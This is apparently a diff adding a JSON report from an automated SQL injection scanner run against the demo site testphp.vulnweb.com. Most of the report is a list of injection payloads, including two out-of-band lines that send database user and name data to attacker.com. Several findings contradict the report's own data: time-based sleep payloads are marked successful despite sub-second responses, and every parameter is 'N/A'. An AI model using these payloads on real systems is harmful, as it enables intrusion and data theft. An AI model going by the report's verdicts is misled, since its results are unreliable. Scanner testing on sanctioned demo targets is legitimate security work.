@@ -1,0 +1,336 @@
+{
+  "target_url": "http://testphp.vulnweb.com/search.php?test=query",
+  "assessment_summary": {
+    "total_parameters_tested": 2,
+    "vulnerable_parameters": 2,
+    "total_injection_tests": 24,
+    "successful_injections": 17,
+    "confidence_score": 0.7058823529411765,
+    "risk_level": "HIGH"
+  },
+  "vulnerable_parameters": [
+    "test",
+    "searchFor"
+  ],
+  "successful_injections": [
+    {
+      "parameter": "N/A",
+      "payload": "' OR '1'='1",
+      "type": "boolean_based",
+      "confidence": 0.7,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' OR 1=1--",
+      "type": "boolean_based",
+      "confidence": 0.7,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "'; WAITFOR DELAY '00:00:05'--",
+      "type": "time_based",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "'; SLEEP(5)--",
+      "type": "time_based",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+      "type": "error_based",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+      "type": "error_based",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "wvs@acunetix.com",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "wvs@acunetix.com",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "'; SELECT @@version--",
+      "type": "stacked_queries",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "'; SELECT database()--",
+      "type": "stacked_queries",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+      "type": "out_of_band",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+      "type": "out_of_band",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' OR '1'='1",
+      "type": "boolean_based",
+      "confidence": 0.7,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' OR 1=1--",
+      "type": "boolean_based",
+      "confidence": 0.7,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+      "type": "error_based",
+      "confidence": 0.6,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "Transitional, InstanceBegin, template, Templates, template",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "Transitional, InstanceBegin, template, Templates, template",
+      "error_message": null
+    }
+  ],
+  "recommendations": [
+    "CRITICAL: SQL injection vulnerabilities detected!",
+    "Immediate action required to secure the application",
+    "Use parameterized queries or prepared statements",
+    "Implement input validation and sanitization",
+    "Consider using an ORM framework"
+  ],
+  "technical_details": {
+    "discovered_parameters": [
+      "test",
+      "searchFor"
+    ],
+    "all_test_results": [
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": true,
+        "response_time": 0.6085207462310791,
+        "confidence": 0.7
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": true,
+        "response_time": 0.5549659729003906,
+        "confidence": 0.7
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": true,
+        "response_time": 0.6580946445465088,
+        "confidence": 0.6
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": true,
+        "response_time": 0.6154947280883789,
+        "confidence": 0.6
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": true,
+        "response_time": 0.6080639362335205,
+        "confidence": 0.6
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": true,
+        "response_time": 0.6145946979522705,
+        "confidence": 0.6
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 0.6231491565704346,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 0.5996694564819336,
+        "confidence": 0.95
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": true,
+        "response_time": 0.611560583114624,
+        "confidence": 0.6
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": true,
+        "response_time": 0.613715648651123,
+        "confidence": 0.6
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": true,
+        "response_time": 0.7247698307037354,
+        "confidence": 0.6
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": true,
+        "response_time": 0.6045289039611816,
+        "confidence": 0.6
+      },
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": true,
+        "response_time": 0.5708770751953125,
+        "confidence": 0.7
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": true,
+        "response_time": 0.5670888423919678,
+        "confidence": 0.7
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 0.547161340713501,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 0.5508019924163818,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": true,
+        "response_time": 0.6054930686950684,
+        "confidence": 0.6
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 0.5335428714752197,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1716203689575195,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 0.6163990497589111,
+        "confidence": 0.95
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 0.5441114902496338,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 0.6392991542816162,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 0.5550737380981445,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 0.6716270446777344,
+        "confidence": 0.0
+      }
+    ]
+  }
+}
